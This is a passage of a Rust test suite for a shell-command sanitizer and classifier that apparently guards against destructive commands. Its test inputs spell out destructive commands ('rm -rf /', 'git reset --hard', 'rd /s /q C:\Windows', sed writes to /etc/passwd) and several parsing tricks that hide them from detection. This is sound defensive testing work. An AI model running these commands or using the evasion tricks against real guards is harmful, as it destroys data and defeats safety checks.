        assert_eq!(text("cat <<'A'\nx\nA\nls"), ["x\nA"]);
        assert_eq!(text("cat <<A <<B\na\nA\nb\nB\nls"), ["a\nA", "b\nB"]);
        // bash ends the body at `E\` joined with `OF`; dash reads on to `EOF`.
        assert_eq!(text("cat <<EOF\nE\\\nOF\nRM x\nEOF\nls"), ["E\\\nOF"]);
        // Both read on past an `EOF` that a backslash-newline continues to.
        assert_eq!(
            text("cat <<EOF\nx\\\nEOF\nRM x\nEOF\nls"),
            ["x\\\nEOF\nRM x\nEOF"]
        );
        // dash reads `$'EOF'` as `$EOF`; bash and zsh as `EOF`.
        assert_eq!(text("cat <<$'EOF'\nx\nEOF\nRM x\n$EOF"), ["x\nEOF"]);
        // Only dash has a body here.
        assert!(text("echo $[1<<2]\nRM x\n2]").is_empty());
        assert!(text("ls\nRM x").is_empty());
    }

    /// A `${` closed on a later line is one word to the shell, its line ends
    /// included, so a `#` on that later line starts no comment and what
    /// follows the `}` runs.
    #[test]
    fn a_braced_expansion_spans_lines() {
        for cmd in [
            "echo ${x:-\n#}; rm -rf /",
            "echo ${x:- a\n# b} && rm -rf /",
            ": ${x:=\n#}\nrm -rf /",
        ] {
            assert!(
                sanitize_for_pattern_matching(cmd).contains("rm -rf /"),
                "{cmd:?}"
            );
            let at = cmd.rfind("rm -rf /").expect("rm");
            assert!(
                classify_command(cmd).spans().iter().all(
                    |span| !span.byte_range.contains(&at) || span.kind.requires_pattern_check()
                ),
                "{cmd:?}: {:?}",
                classify_command(cmd)
            );
        }
        // One left open in a heredoc body ends with the body.
        let cmd = "cat > notes.md <<'EOF'\npath ${x:-\nEOF\n# note\nrm -rf /";
        assert!(sanitize_for_pattern_matching(cmd).contains("rm -rf /"));
    }

    #[test]
    fn sanitize_masks_powershell_block_comment() {
        // A destructive string inside `<# ... #>` must be masked so it can't match
        // any pattern (printed-not-executed; .9.7).
        let cmd = r"Write-Output <# Remove-Item -Recurse -Force C:\src #> done";
        let sanitized = sanitize_for_pattern_matching(cmd);
        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(
            !sanitized.as_ref().contains("Remove-Item -Recurse -Force"),
            "block-comment body leaked: {sanitized}"
        );
        assert!(sanitized.as_ref().contains("Write-Output"));
    }

    #[test]
    fn sanitize_masks_unterminated_powershell_block_comment() {
        let cmd = r"echo ok <# rd /s /q C:\Windows never closed";
        let sanitized = sanitize_for_pattern_matching(cmd);
        assert!(!sanitized.as_ref().contains("rd /s /q"));
    }

    #[test]
    fn sanitize_strips_bd_description_value() {
        let cmd = r#"bd create --description="This pattern blocks rm -rf""#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("bd create"));
        assert!(sanitized.as_ref().contains("--description="));
    }

    #[test]
    fn flowctl_static_words_preserve_quoted_and_escaped_data_540() {
        for (raw, expected) in [
            ("'npm test; git reset --hard'", "npm test; git reset --hard"),
            (
                "\"printf '(literal)' > result\"",
                "printf '(literal)' > result",
            ),
            ("'grep $HOME *.rs | cat'", "grep $HOME *.rs | cat"),
            ("'literal `git reset --hard`'", "literal `git reset --hard`"),
            (
                r"npm\ test\;\ git\ reset\ --hard",
                "npm test; git reset --hard",
            ),
            (r#""\$(git reset --hard)""#, "$(git reset --hard)"),
            ("'multiline\ndata; Ω'", "multiline\ndata; Ω"),
            ("'npm 'test", "npm test"),
            ("''", ""),
        ] {
            assert_eq!(
                flowctl_static_word(raw).as_deref(),
                Some(expected),
                "{raw:?}"
            );
        }
    }

    #[test]
    fn flowctl_static_words_reject_live_or_incomplete_syntax_540() {
        for raw in [
            "",
            "$ARGS",
            "\"$ARGS\"",
            "$(git reset --hard)",
            "\"$(git reset --hard)\"",
            "`git reset --hard`",
            r#""\\$(git reset --hard)""#,
            "*.sh",
            "a?b",
            "[ab]",
            "{a,b}",
            "~/script",
            "a;b",
            "a|b",
            "a&b",
            "(a)",
            "a>b",
            "a<b",
            "#comment",
            "two words",
            "'unterminated",
            "\"unterminated",
            "trailing\\",
        ] {
            assert!(flowctl_static_word(raw).is_none(), "{raw:?}");
        }
    }

    #[test]
    fn sanitize_flowctl_data_preserves_executable_boundaries_540() {
        for source in [
            r#""$FLOWCTL" gate check --command 'npm test; git reset --hard'"#,
            r#"flowctl gate receipt --command="echo (git reset --hard)""#,
            r#"flowctl gate check --command 'grep "$HOME" *.rs; git reset --hard'"#,
            r"flowctl gate check --command npm\ test\;\ git\ reset\ --hard",
        ] {
            let sanitized = sanitize_for_pattern_matching(source);
            assert_eq!(sanitized.len(), source.len(), "{source:?}");
            assert!(!sanitized.contains("git"), "{source:?}: {sanitized}");
            assert!(sanitized.contains("gate"), "{source:?}: {sanitized}");
        }
        for source in [
            r#""$FLOWCTL" gate check --command "$(git reset --hard)""#,
            r#""$FLOWCTL" gate check --command 'npm test'; git reset --hard"#,
            r#""$FLOWCTL" gate check --command 'npm test' > /etc/profile"#,
            r#""$FLOWCTL" gate run --command 'git reset --hard'"#,
            r#""$FLOWCTL" gate check --unknown --command 'git reset --hard'"#,
        ] {
            let sanitized = sanitize_for_pattern_matching(source);
            assert!(
                sanitized.contains("git reset --hard") || sanitized.contains("> /etc/profile"),
                "live or unsupported syntax was hidden: {source:?}: {sanitized}"
            );
        }
    }

    #[test]
    fn sanitize_strips_bd_notes_unquoted_multiword() {
        let cmd = "bd create --notes This references git reset hard";
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("git reset"));
        assert!(sanitized.as_ref().contains("bd create --notes"));
    }

    #[test]
    fn sanitize_stops_multivalue_on_next_flag() {
        let cmd = "bd create --notes This blocks rm rf --priority 2";
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm rf"));
        assert!(sanitized.as_ref().contains("--priority 2"));
    }

    #[test]
    fn sanitize_multivalue_keeps_inline_code_visible() {
        let cmd = "bd create --notes $(rm -rf /) and more";
        let sanitized = sanitize_for_pattern_matching(cmd);

        // Inline code must remain visible; no masking should occur here.
        assert!(matches!(sanitized, std::borrow::Cow::Borrowed(_)));
        assert!(sanitized.as_ref().contains("rm -rf"));
    }

    #[test]
    fn sanitize_does_not_strip_when_inline_code_present() {
        let cmd = r#"bd create --description="$(rm -rf /)""#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        // Inline code must remain visible to the pattern matcher.
        assert!(matches!(sanitized, std::borrow::Cow::Borrowed(_)));
        assert!(sanitized.as_ref().contains("rm -rf"));
    }

    #[test]
    fn sanitize_does_not_strip_input_process_substitution() {
        let cmd = "echo <(rm -rf /)";
        let sanitized = sanitize_for_pattern_matching(cmd);

        // Process substitution executes a command even when passed to an
        // otherwise data-only command such as echo.
        assert!(matches!(sanitized, std::borrow::Cow::Borrowed(_)));
        assert!(sanitized.as_ref().contains("rm -rf"));
    }

    #[test]
    fn classifier_keeps_ampersand_redirection_with_command_span() {
        for cmd in [
            "git&>/dev/null status",
            "git&>>/dev/null status",
            "echo 2>&1 status",
            "echo 1<&2 status",
            "echo >&2 status",
        ] {
            let spans = classify_command(cmd);
            let executable = spans.executable_text(cmd);

            assert!(
                !executable.contains(&"status"),
                "fd redirection must not be classified as a command separator: {cmd}"
            );
        }
    }

    #[test]
    fn sanitize_keeps_fd_duplication_inside_data_command() {
        for cmd in [
            "echo 2>&1 rm -rf /",
            "echo 1<&2 rm -rf /",
            "printf %s >&2 rm -rf /",
        ] {
            let sanitized = sanitize_for_pattern_matching(cmd);

            assert!(
                !sanitized.as_ref().contains("rm -rf"),
                "fd redirection must not expose data-only arguments: {cmd} -> {sanitized}"
            );
        }
    }

    #[test]
    fn sanitize_masks_data_command_arguments_before_any_pipeline_consumer() {
        for cmd in [
            r#"echo "git push --force origin main" | cat"#,
            r#"printf '%s\n' "rm -rf /home/example/data" | cat"#,
            r#"echo "git push --force origin main" | sh"#,
        ] {
            let sanitized = sanitize_for_pattern_matching(cmd);
            assert!(
                !sanitized.as_ref().contains("push --force")
                    && !sanitized.as_ref().contains("rm -rf"),
                "echo/printf argv remains data at sanitization time: {cmd} -> {sanitized}"
            );
        }
    }

    #[test]
    fn sanitize_does_not_strip_output_process_substitution() {
        let cmd = "printf %s >(rm -rf /tmp/not-safe)";
        let sanitized = sanitize_for_pattern_matching(cmd);

        // Output process substitution also executes the inner command. printf
        // may still mask its harmless format string, so only require the
        // executable substitution content to remain visible.
        assert!(sanitized.as_ref().contains("rm -rf"));
    }

    #[test]
    fn sanitize_strips_rg_positional_pattern() {
        let cmd = r#"rg -n "rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("rg -n"));
    }

    #[test]
    fn sanitize_strips_git_grep_positional_pattern() {
        let cmd = r#"git grep "rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("git grep"));
    }

    #[test]
    fn sanitize_handles_git_grep_with_global_options() {
        let cmd = r#"git -C /tmp -c color.ui=auto grep -e "rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(
            sanitized
                .as_ref()
                .contains("git -C /tmp -c color.ui=auto grep -e")
        );
        assert!(sanitized.as_ref().contains("src/main.rs"));
    }

    #[test]
    fn sanitize_strips_ag_positional_pattern() {
        let cmd = r#"ag "rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("ag"));
    }

    #[test]
    fn sanitize_strips_ack_positional_pattern() {
        let cmd = r#"ack "rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("ack"));
    }

    #[test]
    fn sanitize_handles_rg_fixed_strings_flag_with_other_options() {
        let cmd = r#"rg --fixed-strings -n "rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("rg --fixed-strings -n"));
    }

    #[test]
    fn sanitize_masks_sed_positional_script() {
        let sanitized = sanitize_for_pattern_matching("echo a=b | sed -E 's/=.*/=<set>/'");
        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains(">/"));
        assert!(sanitized.as_ref().contains("sed -E"));
    }

    #[test]
    fn sanitize_masks_sed_expression_flag_value() {
        let sanitized = sanitize_for_pattern_matching("sed -e 's/rm -rf //' notes.txt");
        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("notes.txt"));
    }

    #[test]
    fn sanitize_accounts_for_sed_line_length_option_arity() {
        let sanitized = sanitize_for_pattern_matching("echo a=b | sed -l 80 -E 's/=.*/=<set>/'");
        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains(">/"));
        assert!(sanitized.as_ref().contains("sed -l"));
        assert!(sanitized.as_ref().contains("-E"));
    }

    #[test]
    fn sanitize_keeps_shell_code_inside_sed_script_visible() {
        let sanitized = sanitize_for_pattern_matching(r#"sed "s/x/$(rm -rf /)/" file.txt"#);
        assert!(sanitized.as_ref().contains("rm -rf"));
    }

    #[test]
    fn sanitize_masks_sed_programs_handled_by_semantic_execution_pass() {
        for command in [
            "sed 'e rm -rf /' file.txt",
            "sed -e 's|x|rm -rf /|e' file.txt",
        ] {
            let sanitized = sanitize_for_pattern_matching(command);
            assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
            assert!(!sanitized.as_ref().contains("rm -rf"));
        }
    }

    #[test]
    fn sanitize_keeps_file_writing_and_complex_sed_programs_visible() {
        for command in [
            "sed --expression='s|x|data|w /etc/passwd' file.txt",
            "sed 'w /etc/passwd' file.txt",
            "sed 's|x|safe|g; e rm -rf /' file.txt",
        ] {
            let sanitized = sanitize_for_pattern_matching(command);
            assert_eq!(sanitized.as_ref(), command, "unsafe sed program was masked");
        }
    }

    #[test]
    fn sanitize_masks_only_nonexecuting_sed_substitutions() {
        for command in [
            "sed 's|rm -rf /|safe|g' file.txt",
            "sed -e 's|>/|greater slash|p' file.txt",
            "sed --expression='s|/etc/passwd|redacted|I' file.txt",
        ] {
            let sanitized = sanitize_for_pattern_matching(command);
            assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
            assert!(!sanitized.as_ref().contains("rm -rf"));
            assert!(!sanitized.as_ref().contains("/etc/passwd"));
        }
    }

    #[test]
    fn sanitize_handles_grep_fixed_strings_flag_with_other_options() {
        let cmd = r#"grep -F -n "rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("grep -F -n"));
    }

    #[test]
    fn sanitize_handles_attached_search_pattern_value_rg() {
        let cmd = r#"rg -e"rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("rg -e"));
    }

    #[test]
    fn sanitize_handles_attached_search_pattern_value_grep() {
        let cmd = r#"grep -e"rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("grep -e"));
    }

    #[test]
    fn sanitize_handles_attached_search_pattern_value_ag() {
        let cmd = r#"ag -e"rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("ag -e"));
        assert!(sanitized.as_ref().contains("src/main.rs"));
    }

    #[test]
    fn sanitize_handles_attached_search_pattern_value_ack() {
        let cmd = r#"ack -e"rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("ack -e"));
        assert!(sanitized.as_ref().contains("src/main.rs"));
    }

    #[test]
    fn sanitize_handles_attached_git_commit_message() {
        let cmd = r#"git commit -m"Fix rm -rf detection""#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("git commit -m"));
    }

    #[test]
    fn sanitize_handles_sudo_wrapper() {
        let cmd = r#"sudo git commit -m "Fix rm -rf detection""#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("sudo git commit -m"));
    }

    #[test]
    fn sanitize_tracks_data_commands_after_shell_control_prefixes() {
        for cmd in [
            r"if printf '%-50s -> %s\n' a b; then true; fi; mv x y",
            r"if true; then printf '%-50s -> %s\n' a b; fi; mv x y",
            r"if false; then true; elif printf '%-50s -> %s\n' a b; then true; fi; mv x y",
            r"if false; then true; else printf '%-50s -> %s\n' a b; fi; mv x y",
            r"while printf '%-50s -> %s\n' a b; do true; done; mv x y",
            r"until printf '%-50s -> %s\n' a b; do true; done; mv x y",
            r"while false; do printf '%-50s -> %s\n' a b; done; mv x y",
            r"{ printf '%-50s -> %s\n' a b; }; mv x y",
            r"! printf '%-50s -> %s\n' a b; mv x y",
            r"coproc printf '%-50s -> %s\n' a b; mv x y",
        ] {
            let sanitized = sanitize_for_pattern_matching(cmd);
            assert!(
                !sanitized.as_ref().contains("->"),
                "printf format string leaked after shell control prefix: {cmd} -> {sanitized}"
            );
            assert!(
                sanitized.as_ref().contains("mv x y"),
                "later executable segment was unexpectedly masked: {cmd} -> {sanitized}"
            );
        }
    }

    #[test]
    fn sanitize_does_not_skip_reserved_spellings_selected_as_executables() {
        for cmd in [
            r"command then printf '%-50s -> %s\n' a b; mv x y",
            r"env then printf '%-50s -> %s\n' a b; mv x y",
            r"sudo then printf '%-50s -> %s\n' a b; mv x y",
            r"/usr/bin/then printf '%-50s -> %s\n' a b; mv x y",
            r"'then' printf '%-50s -> %s\n' a b; mv x y",
            r"command coproc printf '%-50s -> %s\n' a b; mv x y",
            r"env coproc printf '%-50s -> %s\n' a b; mv x y",
            r"sudo coproc printf '%-50s -> %s\n' a b; mv x y",
            r"/usr/bin/coproc printf '%-50s -> %s\n' a b; mv x y",
            r"'coproc' printf '%-50s -> %s\n' a b; mv x y",
        ] {
            let sanitized = sanitize_for_pattern_matching(cmd);
            assert!(
                sanitized.as_ref().contains("->"),
                "arguments of an explicitly selected executable were masked: {cmd} -> {sanitized}"
            );
        }
    }

    #[test]
    fn sanitize_keeps_real_redirect_after_shell_control_prefix_visible() {
        let cmd = r#"if true; then printf '%s' x > "$SOMEDIR/x"; fi"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(
            sanitized.as_ref().contains(r#"> "$SOMEDIR/x""#),
            "real redirect target was masked: {cmd} -> {sanitized}"
        );
    }

    #[test]
    fn sanitize_handles_sudo_wrapper_with_path() {
        let cmd = r#"/usr/bin/sudo git commit -m "Fix rm -rf detection""#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("/usr/bin/sudo git commit -m"));
    }

    #[test]
    fn sanitize_handles_sudo_u_wrapper() {
        let cmd = r#"sudo -u root git commit -m "Fix rm -rf detection""#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("sudo -u root git commit -m"));
    }

    #[test]
    fn sanitize_handles_env_unset_wrapper() {
        let cmd = r#"env -u FOO rg -n "rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("env -u FOO rg -n"));
    }

    #[test]
    fn sanitize_handles_env_unset_wrapper_with_path() {
        let cmd = r#"/usr/bin/env -u FOO rg -n "rm -rf" src/main.rs"#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("/usr/bin/env -u FOO rg -n"));
    }

    #[test]
    fn sanitize_masks_command_query_v() {
        let cmd = r#"command -v "rm -rf""#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("command -v"));
    }

    #[test]
    fn sanitize_masks_command_query_v_combined() {
        let cmd = r#"command -pv "rm -rf""#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("command -pv"));
    }

    #[test]
    fn sanitize_does_not_mask_command_p_wrapper() {
        let cmd = r"command -p rm -rf /tmp";
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Borrowed(_)));
        assert!(sanitized.as_ref().contains("rm -rf"));
    }

    #[test]
    fn sanitize_handles_combined_short_flags_with_data_value() {
        let cmd = r#"git commit -am "Fix rm -rf detection""#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("git commit -am"));
    }

    #[test]
    fn sanitize_masks_fully_quoted_attached_message_values_at_source_offsets() {
        let value = "document git reset --hard — café";
        for flag in ["--message=", "-m", "-am"] {
            for quote in ['\'', '"'] {
                let command = format!("git commit {quote}{flag}{value}{quote} --allow-empty");
                let sanitized = sanitize_for_pattern_matching(&command);
                let start = command.find(value).expect("message value");
                let end = start + value.len();
                assert_eq!(sanitized.len(), command.len());
                assert_eq!(&sanitized[..start], &command[..start]);
                assert!(
                    sanitized.as_bytes()[start..end]
                        .iter()
                        .all(|byte| *byte == b' ')
                );
                assert_eq!(&sanitized[end..], &command[end..]);
            }
        }
    }

    #[test]
    fn sanitize_recognizes_fully_quoted_separate_message_flags() {
        for flag in ["-m", "--message", "-am"] {
            for quote in ['\'', '"'] {
                let command =
                    format!("git commit {quote}{flag}{quote} 'git reset --hard' --allow-empty");
                let sanitized = sanitize_for_pattern_matching(&command);
                assert_eq!(sanitized.len(), command.len());
                assert!(
                    !sanitized.contains("git reset --hard"),
                    "{command}: {sanitized}"
                );
                assert!(sanitized.contains(&format!("{quote}{flag}{quote}")));
                assert!(sanitized.ends_with(" --allow-empty"));
            }
        }
        let command = "br create --description 'git reset --hard' '--priority' 2";
        let sanitized = sanitize_for_pattern_matching(command);
        assert!(!sanitized.contains("git reset --hard"));
        assert!(sanitized.ends_with(" '--priority' 2"));
    }

    #[test]
    fn sanitize_quoted_flags_preserve_live_substitutions_and_mask_literal_markers() {
        for flag in ["--message=", "-m", "-am"] {
            for substitution in ["$(git reset --hard)", "`git reset --hard`"] {
                let live = format!("git commit \"{flag}see {substitution}\"");
                assert_eq!(sanitize_for_pattern_matching(&live), live);
                let literal = format!("git commit '{flag}see {substitution}'");
                let sanitized = sanitize_for_pattern_matching(&literal);
                assert_eq!(sanitized.len(), literal.len());
                assert!(
                    !sanitized.contains("git reset --hard"),
                    "{literal}: {sanitized}"
                );
            }
        }
        for command in [
            r#"git commit '--message' "see $(git reset --hard)""#,
            r#"git commit "-m" "see `git reset --hard`""#,
            r#"git commit '-am' "see $(git reset --hard)""#,
        ] {
            assert_eq!(sanitize_for_pattern_matching(command), command);
        }
    }

    #[test]
    fn sanitize_does_not_guess_concatenated_quoted_flags() {
        for command in [
            "git commit '--mes''sage=git reset --hard'",
            r#"git commit "--mes""sage=git reset --hard""#,
            "git commit '-m''git reset --hard'",
            "git commit '-a''m' 'git reset --hard'",
        ] {
            assert_eq!(sanitize_for_pattern_matching(command), command);
        }
    }

    #[test]
    fn sanitize_handles_sudo_d_chdir_wrapper() {
        // sudo -D changes to directory before running command
        let cmd = r#"sudo -D /tmp git commit -m "Fix rm -rf detection""#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("sudo -D /tmp git commit -m"));
    }

    #[test]
    fn sanitize_handles_sudo_r_role_wrapper() {
        // sudo -r uses specified role
        let cmd = r#"sudo -r myrole git commit -m "Fix rm -rf detection""#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(sanitized.as_ref().contains("sudo -r myrole git commit -m"));
    }

    #[test]
    fn sanitize_handles_sudo_chdir_long_wrapper() {
        // sudo --chdir changes to directory before running command
        let cmd = r#"sudo --chdir=/tmp git commit -m "Fix rm -rf detection""#;
        let sanitized = sanitize_for_pattern_matching(cmd);

        assert!(matches!(sanitized, std::borrow::Cow::Owned(_)));
        assert!(!sanitized.as_ref().contains("rm -rf"));
        assert!(
            sanitized
                .as_ref()
                .contains("sudo --chdir=/tmp git commit -m")
        );
    }

    #[test]
    fn test_regression_quoted_interpreter_identifies_inline_code() {
        // Regression test for bug where quoted interpreter paths (e.g. "/usr/bin/python")
        // caused check_inline_code_context to fail, treating -c content as safe argument.

        let cmd = r#""/usr/bin/python" -c "rm -rf /""#;
        let spans = classify_command(cmd);

        let code_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);

        assert!(
            code_span.is_some(),
            "Quoted interpreter path must still detect -c as InlineCode"
        );

        let cmd_simple = r#""python" -c "rm -rf /""#;
        let spans_simple = classify_command(cmd_simple);
        let code_span_simple = spans_simple
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);

        assert!(
            code_span_simple.is_some(),
            "Quoted interpreter name must still detect -c as InlineCode"
        );
    }

    // =========================================================================
    // Safe String Registry Tests - New Entries (oien.2.1)
    // =========================================================================

    #[test]
    fn test_registry_git_grep_flag() {
        // git --grep takes a pattern for searching commit messages (data, not code)
        assert!(SAFE_STRING_REGISTRY.is_flag_data("git", "--grep"));
        // Short version doesn't exist for --grep
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("git", "-g"));
    }

    #[test]
    fn test_registry_ag_pattern_flags() {
        // ag (Silver Searcher) -e/--pattern take search patterns
        assert!(SAFE_STRING_REGISTRY.is_flag_data("ag", "-e"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("ag", "--pattern"));
    }

    #[test]
    fn test_registry_ack_pattern_flags() {
        // ack -e/--pattern take search patterns
        assert!(SAFE_STRING_REGISTRY.is_flag_data("ack", "-e"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("ack", "--pattern"));
    }

    #[test]
    fn test_registry_curl_data_flags() {
        // curl -d/--data, -H/--header, --data-raw, --data-binary are data
        assert!(SAFE_STRING_REGISTRY.is_flag_data("curl", "-d"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("curl", "--data"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("curl", "-H"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("curl", "--header"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("curl", "--data-raw"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("curl", "--data-binary"));
        // But --url is NOT data (it could be code injection target)
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("curl", "--url"));
    }

    #[test]
    fn test_registry_jq_variable_flags() {
        // jq --arg, --argjson, --slurpfile pass data values
        assert!(SAFE_STRING_REGISTRY.is_flag_data("jq", "--arg"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("jq", "--argjson"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("jq", "--slurpfile"));
        // But -f/--from-file takes a file path that gets executed
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("jq", "-f"));
    }

    #[test]
    fn test_registry_docker_label_flags() {
        // docker -l/--label sets metadata
        assert!(SAFE_STRING_REGISTRY.is_flag_data("docker", "-l"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("docker", "--label"));
        // But --entrypoint is NOT data (it's code)
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("docker", "--entrypoint"));
    }

    #[test]
    fn test_registry_kubectl_annotation_label_flags() {
        // kubectl --annotation, -l/--label set metadata
        assert!(SAFE_STRING_REGISTRY.is_flag_data("kubectl", "--annotation"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("kubectl", "-l"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("kubectl", "--label"));
        // But --command is NOT data (it's code)
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("kubectl", "--command"));
    }

    #[test]
    fn test_registry_xargs_placeholder_flag() {
        // The `-I` placeholder is the word that ends xargs' options. Masking
        // it left `xargs -I   unlink {}`, where every option parser reads the
        // child command as the placeholder and the executed `unlink` vanished.
        assert!(!SAFE_STRING_REGISTRY.is_flag_data("xargs", "-I"));
        for command in [
            "xargs -I{} unlink {}",
            "xargs -I {} unlink {}",
            "cat list | xargs -I{} mv {} /tmp/x",
            "xargs -I% unlink %",
        ] {
            assert_eq!(
                sanitize_for_pattern_matching(command),
                command,
                "the xargs placeholder must stay in the sanitized argv: {command:?}"
            );
        }
        // Counterexample: xargs itself can execute commands
        assert!(!SAFE_STRING_REGISTRY.is_all_args_data("xargs"));
    }

    #[test]
    fn test_registry_cargo_npm_message_flags() {
        // cargo/npm --message for version messages
        assert!(SAFE_STRING_REGISTRY.is_flag_data("cargo", "--message"));
        assert!(SAFE_STRING_REGISTRY.is_flag_data("npm", "--message"));
    }

    #[test]
    fn test_false_positive_curl_data() {
        // curl -d with destructive-looking data should NOT trigger
        let cmd = r#"curl -d "rm -rf /" https://api.example.com"#;

        // Using the registry, we know -d flag args are data
        assert!(SAFE_STRING_REGISTRY.is_flag_data("curl", "-d"));

        // The data should be classified as Argument
        let spans = classify_command(cmd);
        let data_span = spans
            .spans()
            .iter()
            .find(|s| s.text(cmd).contains("rm -rf"));
        assert!(data_span.is_some());
